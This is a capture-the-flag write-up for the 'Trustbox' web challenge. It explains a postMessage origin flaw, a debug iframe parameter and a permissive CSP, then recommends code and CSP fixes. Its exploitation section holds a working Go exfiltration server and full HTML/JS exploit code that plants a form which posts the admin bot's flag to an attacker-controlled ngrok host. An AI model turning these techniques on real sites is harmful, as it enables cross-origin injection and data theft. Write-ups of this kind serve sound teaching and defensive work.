# Trustbox

## Overview

The [Trustbox](https://hackthe.space/challenge/trustbox) application allows the
user to upload any file and store it in the browsers memory for as long the
website is open.

## Vulnerability

First, there is a debug code snipped in the file 
`https://trustbox.hackthe.space/static/trustbox-client.js` which allows, an 
attacker to control the source of the iframe by setting the query parameter 
`debug`. For example the following URL sets the iframe source to `evil.com`:
`https://trustbox.hackthe.space?debug=https://evil.com`.

Next, the script `https://trustbox.hackthe.space/static/trustbox-server.js` 
doesn't check from which origin the events are emitted, and will always create 
a new ObjectURL for any file. This is especially dangerous since the created
Files have the origin `trustbox.hackthe.space`. Furthermore, this script 
sets in the function-call [`Window.postMessage()`](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage)
the argument `targetOrigin` to the wildcard `"*"` which could have easily 
prevented this vulnerability.

Moreover, the [SCP](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
has the following script source `script-src 'self' blob:`. However, there is no
need to allow blob files as scripts for the app to function.

## Exploitation

During the exploitation I was on a Discord call with ████,
████ and ████, we explored the challenge 
together and discussed approaches created our payload on our own and never 
shared the flag.

### Exploration

First, we explored the webapp by drag and dropping a file on the big logo and 
then clicking on the appeared link. During the upload we found out that the
upload happened instantly which seamed odd. So we repeated this action and
figured out that the website doesn't even do any network requests, by looking 
into Firefox's [Network Monitor](https://developer.mozilla.org/en-US/docs/Tools/Network_Monitor).
There also is a [contacts page](https://trustbox.hackthe.space/contacts) where 
we can submit links which will be opened by the admin-bot.

Next, we wanted to understand how the app can host files without uploading them
(and also without using, [localstorage](https://developer.mozilla.org/en-US/docs/Web/API/Window/localStorage)).
After looking at the html and JS code of the root page and the hidden iframe, we
figured out that the data in the app flows like:

1) The root page listens on file drop events, and then sends each file object 
   with a `postMessage` event to the hidden iframe.
2) The hidden iframe creates an objectURL with the 
   [`createObjectURL()`](https://developer.mozilla.org/en-US/docs/Web/API/URL/createObjectURL)
   function, and then sends the created URL back to the events source.
3) The root page now receives the created URL and creates new DOM elements to 
   display a link to the file.

During this exploration we also found out that we can control the source of 
the hidden iframe as there is some debug code left in the application. For 
example the following URL loads the the domain `evil.com` as the source of the
iframe:

```
https://trustbox.hackthe.space?debug=https://evil.com
```

### Server Setup

At this point it became obvious that we will need to create a server to serve 
evil pages to exploit the application. Since I have written a couple of servers 
already in [Go](https://golang.org/) I chose this language to write my server.

The server only has two routes, `/` serves the html file `index.html` and any 
request to `/leak` will print the request body and useragent to stdout.

```go
// File: main.go
package main

import (
    "fmt"
    "io"
    "log"
    "net/http"
    "os"
)

// Serve the file inner.html
func root(w http.ResponseWriter, r *http.Request) {
    log.Printf("%s %s", r.Method, r.URL.String())
    bytes, _ := os.ReadFile("index.html")
    w.Write(bytes)
}

func leak(w http.ResponseWriter, r *http.Request) {
    log.Printf("%s %s", r.Method, r.URL.String())
    bytes, _ := io.ReadAll(r.Body)

    // Write the body as a string to stdout
    log.Printf("Leaked Body: %+v\n", string(bytes))
    log.Printf("Leaked Agent: %+v\n", r.Header["User-Agent"])
}

func main() {
    // Setup routes
    http.HandleFunc("/", root)
    http.HandleFunc("/leak", leak)

    // Start listending for requests
    fmt.Println("Listening")
    log.Fatal(http.ListenAndServe(":3000", nil))
}
```

Now to start the server and make it available on the internet we will use 
[ngrok](https://ngrok.com/):

```bash
$ go run main.go
$ ngrok http 3000
```

To prove that the setup works, I wrote myself a simple html page which
just sends a request to the `/leak` endpoint:

```html
<!-- File: index.html -->
<html>
<script>
    // TODO: replace the link with the one you got from ngrok
    fetch('https://XXXX.ngrok.io/leak', {
        method: 'POST',
        body: "Hello from the other frame 🎶🎵",
    })
</script>
</html>
```

And it works, I can automatically send myself messages and successfully 
control the trustbox's iframe with:
`https://trustbox.hackthe.space/?debug=https://XXXX.ngrok.io`

### Exploiting

After **a lot** of other attempts, we figured out that when we open a file 
that was uploaded to trustbox and typing `window.origin` into the 
console it returns `https://trustbox.hackthe.space` which is the same origin as
the root page of the application. This means that if we can use such an uploaded
file as the iframes source we can manipulate the parent page as there is no 
longer cross origin violation.

So with this in mind I wrote the following `index.html`:

```html
<!-- File: index.html -->
<!DOCTYPE html>
<html lang="en">
  <iframe id="child" src="https://trustbox.hackthe.space/store"></iframe>
  <script>
    async function createEvilJS() {
      const js = `const header = document.createElement("h1");
        header.innerText = "Flotschi was here";
        window.parent.document.getElementById("upfiles").appendChild(header);`;

      const file = new File([js], "evil_script", {
        type: "application/javascript",
      });
      const iframe = document.getElementById("child").contentWindow;
      iframe.postMessage({ action: "add", file: file }, "*");
    }

    async function createEvilHTML(evilJS) {
      const html = `<html> <script src="${evilJS}"><\/script></html>`;
      const file = new File([html], "evil_page", {
        type: "text/html",
      });
      const iframe = document.getElementById("child").contentWindow;
      iframe.postMessage({ action: "add", file: file }, "*");
    }

    window.addEventListener(
      "message",
      function (m) {
        // Pass all messages through
        window.parent.postMessage(m.data, "*");

        if (m.data.name === "evil_script") {
          // Script created, now create page t use script
          createEvilHTML(m.data.url);
        }
        if (m.data.name === "evil_page") {
          // Page and scrtipt created, now open trustbox and inject evil page
          window.open("https://trustbox.hackthe.space/?debug=" + m.data.url);
        }
      },
      false
    );

    // Start with the evil script creation when page is done loading
    window.onload = createEvilJS;
  </script>
</html>
```

The script in this html page, first creates a BlobURL which contains the
Javascript to create a new header element in its parent. Once this is created,
it creates a second BlobURL which contains a html page which uses the just 
created Javascript blob. The reason for this is that the created pages have the 
same origin as trustbox and on trustbox the content policy is set with 
`script-src: self` which forbids inline Javascript from being executed. 
After both files are created, it opens a new tab with `window.open()`, which
normally would be blocked from [Chromes Popup Blocker](https://support.google.com/chrome/answer/95472?co=GENIE.Platform%3DDesktop&hl=en), 
but [Pupeteer](https://pptr.dev/) has this disabled by default.

When we now reload the page `https://trustbox.hackthe.space/?debug=https://XXXX.ngrok.io`
(there is no need to restart or recompile the go server), we see that instantly,
two files are on the page and after we temporarily disable the popup blocker, we
can see a new page with an injected header.

With the trusted types restrictions, we are not allowed to use functions/fields
like `element.innerHTML` or create new script elements. However, these 
restrictions are quite easy to work around. 

From the challenge description, and the bots sourcecode, we know that the bot 
searches for an input element with the id=`flag` and after it enters the flag 
into it, it presses enter. Luckily we can use a 
[form element](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/form)
which has the default behaviour to submit the form if the user presses
enter.

However, the bot only enters the flag if there is a script with the id `pwn` on
the page. Since the [trusted types](https://developer.mozilla.org/en-US/docs/Web/API/Trusted_Types_API) 
policy forbidds us from creating new scripts with the `src` 
attribute set, we need to use one of the two existing scripts and add the 
needed id=`flag` (they already have the `src` attribute set).

The complete exploit looks like this (only the script in the `createEvilJS` function changed):

```html
<!-- File: index.html -->
<!DOCTYPE html>
<html lang="en">
  <iframe id="child" src="https://trustbox.hackthe.space/store"></iframe>
  <script>
    async function createEvilJS() {
      const js = `
    const form = document.createElement("form");
    form.setAttribute("action", "${window.origin}/leak");
    form.setAttribute("method", "POST");

    const input = document.createElement("input");
    input.setAttribute("id", "flag");
    input.setAttribute("name", "flag");
    input.setAttribute("type", "text");
    form.appendChild(input);

    window.parent.document
      .getElementsByTagName("script")[0]
      .setAttribute("id", "pwn");

    window.parent.document.getElementById("upfiles").appendChild(form);
          `;

      const file = new File([js], "evil_script", {
        type: "application/javascript",
      });
      const iframe = document.getElementById("child").contentWindow;
      iframe.postMessage({ action: "add", file: file }, "*");
    }

    async function createEvilHTML(evilJS) {
      const html = `<html> <script src="${evilJS}"><\/script></html>`;
      const file = new File([html], "evil_page", {
        type: "text/html",
      });
      const iframe = document.getElementById("child").contentWindow;
      iframe.postMessage({ action: "add", file: file }, "*");
    }

    window.addEventListener(
      "message",
      function (m) {
        // Pass all messages through
        window.parent.postMessage(m.data, "*");

        if (m.data.name == "evil_script") {
          // Script created, now create page t use script
          createEvilHTML(m.data.url);
        }
        if (m.data.name == "evil_page") {
          // Page and scrtipt created, now open trustbox and inject evil page
          window.open("https://trustbox.hackthe.space/?debug=" + m.data.url);
        }
      },
      false
    );

    // Start with the evil script creation when page is done loading
    window.onload = createEvilJS;
  </script>
</html>
```

Now all we need to do is to go to the contact page and report the URL
`https://trustbox.hackthe.space/?debug=https://XXXX.ngrok.io` and after
a couple of seconds we see the following lines in the output of our server:

```
2021/05/19 08:44:29 GET /
2021/05/19 08:44:30 POST /leak
2021/05/19 08:44:30 Leaked Body: flag=WUT%7Bd0_1_h4v3_7rU5T_I55U3s%7D
2021/05/19 08:44:30 Leaked Agent: [Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/90.0.4430.212 Safari/537.36]
```

And after we url decode the flag (for example with [this website](https://www.urldecoder.org/))
we are done.

## Solution

First, the debug code from the `https://trustbox.hackthe.space/static/trustbox-client.js`
should be removed so that the load event-listener looks like that:

```javascript
// File: trustbox-client.js

[...]

window.addEventListener("load", function() {
    const dropbox = document.getElementById("dropbox");
    const src = "store";
    const section = document.getElementsByTagName("section")[0];
    const iframe = document.createElement("iframe");
    iframe.setAttribute("src", src);
    iframe.setAttribute("width", 0);
    iframe.setAttribute("height", 0);
    section.appendChild(iframe);

    dropbox.addEventListener("dragenter", dragenter, false);
    dropbox.addEventListener("dragover", dragover, false);
    dropbox.addEventListener("drop", drop, false);
    window.addEventListener('message', handleMessage, false);
});
```

Next, the script in `https://trustbox.hackthe.space/static/trustbox-server.js`
should only create new blobURL objects if the origin of the event emitter is 
equal to its own:

```javascript
function handlerMessage(event) {
    if (event.origin !== window.origin) return;

    let message = event.data;
    if (message.action === "add") {
        event.source.postMessage({name: message.file.name, url: URL.createObjectURL(message.file)}, window.origin);
    } else {
        // TODO: implement file removal
    }

}

window.addEventListener('message', handlerMessage, false);
```

The `if` in the first line of the function is probably not necessary as it 
would already be pretty hard/impossible to exploit the website if the 
targetOrigin in the [`Window.postMessage()`](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage)
is correctly set to `window.origin`. But maybe an attacker could still exploit
the website, as they could still create blobURL objects, they could just not
see the URL that was created. So one possible attack might be to spray a lot 
of objects and hope to guess one correctly (this might be really easy or almost 
impossible, depending on how the URLs are created and wether or not the name is 
cryptographically random). Since I couldn't find anything online that this attack
works, I currently assume that this won't work.

Last, there is no need that the CSP allows blob files as script sources, so the
CSP should look like:

```
Content-Security-Policy: script-src 'self'; object-src 'none'; trusted-types tt; require-trusted-types-for 'script'
```